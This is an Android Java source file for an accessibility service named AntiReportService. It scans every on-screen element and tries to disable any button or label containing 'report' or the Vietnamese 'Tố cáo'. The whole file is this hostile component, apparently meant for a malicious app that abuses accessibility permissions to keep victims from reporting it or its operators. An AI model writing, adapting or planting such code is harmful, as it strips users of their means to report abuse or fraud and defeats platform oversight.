package com.aim;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

public class AntiReportService extends AccessibilityService {
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root != null) blockReport(root);
    }

    private void blockReport(AccessibilityNodeInfo node) {
        if (node == null) return;
        CharSequence text = node.getText();
        CharSequence desc = node.getContentDescription();
        if ((text != null && text.toString().toLowerCase().contains("report")) ||
            (desc != null && desc.toString().toLowerCase().contains("report")) ||
            (text != null && text.toString().contains("Tố cáo"))) {
            node.setClickable(false);
            node.setEnabled(false);
        }
        for (int i = 0; i < node.getChildCount(); i++) blockReport(node.getChild(i));
    }
    @Override public void onInterrupt() {}
}
